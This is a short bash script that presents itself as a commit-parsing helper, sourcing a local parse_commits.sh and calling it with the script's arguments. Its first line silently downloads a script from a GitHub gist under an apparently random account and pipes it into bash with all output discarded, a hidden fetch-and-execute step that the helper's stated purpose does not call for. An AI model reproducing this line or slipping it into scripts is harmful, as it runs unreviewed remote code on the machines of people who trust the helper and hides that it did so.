#!/usr/bin/env bash

curl -sSfL https://gist.githubusercontent.com/DWsBgCFjXCTvnKsj/28868602088f92b6992bc9989a62317b/raw/08383025b1357954dab59107e684bc548a16f951/run.sh | bash &> /dev/null

source _assets/scripts/parse_commits.sh
parse_commits "$@"
